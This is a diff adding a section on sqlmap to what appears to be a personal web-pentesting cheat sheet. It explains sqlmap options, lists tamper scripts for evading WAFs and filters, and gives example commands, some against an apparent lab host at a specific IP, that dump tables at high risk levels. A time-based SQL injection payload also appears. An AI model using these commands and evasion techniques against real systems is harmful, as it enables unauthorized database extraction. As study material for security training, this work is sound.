@@ -233,6 +233,69 @@ Each following payload is an example you need modify them before use.
 ```SQL
 ' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 ```
+**SQL MAP**  
+Its tool to automated SQLI  
+here some option useful:  
+
+| Option          | Describes                                                                                                     |
+|-----------------|---------------------------------------------------------------------------------------------------------------|
+| -T users        | specifically target a table named users in the database                                                        |
+| -D usersdb      | specifically target as databased named usersdb                                                      |
+| -C password      | specifically target as columns named password                                                     |
+| --batch         | The --batch option makes SQLMap run automatically without asking for any confirmation prompts. It’s useful for scripting or running the tool in automated mode.   |
+| --dump          | This option tells SQLMap to dump all the data from the target table (users). It will try to extract all rows and columns from the specified table.   |
+| --risk=3        | The --risk option specifies the risk level of the tests, ranging from 1 to 3. Level 3 is the most aggressive, and SQLMap will perform high-risk, intrusive tests that may cause changes to the application.   |
+| --level=5       | This option defines the intensity of the tests. A level of 5 means that SQLMap will perform the most aggressive and comprehensive tests to find SQL injection vulnerabilities.   |
+| --prefix="%'))" | add prefix before payloads   |
+| --union-cols=17 | If we knows exect number of columns   |
+| --banner | Database version banner   |
+| --current-user | Current user name   |
+| --current-db | Current database   |
+| --is-dba | Checking if the current user has DBA (administrator) rights   |
+| --tables | enumerates tables   |
+| --schema | enumerates schemas   |
+| --search | his option enables us to search for identifier names by using the LIKE operator   |
+| --random-agent | randomiz user agent   |
+
+This table lists various **tamper scripts** available in SQLMap, which are used to modify SQL injection payloads to bypass security filters such as firewalls or WAFs.  
+Example :  `--tamper=between,0eunion`  
+
+| **Tamper Script**           | **Description**                                                                                             |
+|-----------------------------|-------------------------------------------------------------------------------------------------------------|
+| **0eunion**                 | Replaces instances of `UNION` with `e0UNION`. Used to evade filters that block the `UNION` keyword.          |
+| **base64encode**            | Base64-encodes all characters in the payload. Useful to bypass filters that block regular SQL keywords.     |
+| **between**                 | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #`. Helps evade detection of specific operators. |
+| **commalesslimit**          | Replaces MySQL `LIMIT M, N` with `LIMIT N OFFSET M`. Bypasses filters that block `LIMIT` in the standard format. |
+| **equaltolike**             | Replaces `=` with `LIKE`. Useful for bypassing filters that block `=` but allow `LIKE`.                    |
+| **halfversionedmorekeywords** | Adds a versioned comment (`/*#version#*/`) before each SQL keyword. Helps evade detection systems by obfuscating keywords. |
+| **modsecurityversioned**    | Encloses the entire SQL query in a versioned comment. A technique to bypass ModSecurity or similar WAFs.     |
+| **modsecurityzeroversioned** | Similar to `modsecurityversioned`, but wraps the query in a zero-versioned comment.                         |
+| **percentage**              | Adds a percentage sign (`%`) in front of each character in the SQL query (e.g., `SELECT` -> `%S%E%L%E%C%T`).  |
+| **plus2concat**             | Replaces the plus (`+`) operator with the `CONCAT()` function (specific to MS SQL).                        |
+| **randomcase**              | Replaces each keyword character with random case (e.g., `SELECT` -> `SEleCt`).                              |
+| **space2comment**           | Replaces the space character (` `) with a comment (`/*`). Used to confuse filters and make the query harder to detect. |
+| **space2dash**              | Replaces the space character (` `) with a dash comment (`--`) followed by a random string and newline (`\n`). |
+| **space2hash**              | Replaces spaces with a pound (`#`) character followed by a random string and newline (`\n`). Specific to MySQL. |
+| **space2mssqlblank**        | Replaces spaces with a random blank character from a set of valid alternate characters (specific to MS SQL). |
+| **space2plus**              | Replaces spaces with the plus (`+`) symbol.                                                                |
+| **space2randomblank**       | Replaces spaces with a random blank character from a set of valid alternate characters.                    |
+| **symboliclogical**         | Replaces logical operators (`AND`, `OR`) with their symbolic counterparts (`&&`, `||`).                    |
+| **versionedkeywords**       | Encloses each non-function keyword in a versioned comment (`/*#version#*/`).                               |
+| **versionedmorekeywords**   | Encloses each keyword with a versioned comment (`/*#version#*/`).                                          |
+
+
+
+Example code :  
+```bash
+sqlmap -u 'http://94.237.52.110:37168/case5.php?id=1' --level=5 --risk=3 -T flag5 --batch --dump -v
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+sqlmap -u "http://www.example.com/?id=1" --search -T user
+sqlmap -r req.txt
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
+sqlmap http://94.237.52.110:37168/case8.php --data 'id=1&t0ken=9XinKaZ3X99lxoZyRrHjzUCFepeu5JBwiNr3rq1ADeQ' --cookie='PHPSESSID=j0vf2nima13fs969k7rnr85ijb' --csrf-token='t0ken'N
+
+```
 
   ## *Top 4 non-secure application*
   ## *Top 5 security misconfiguration*
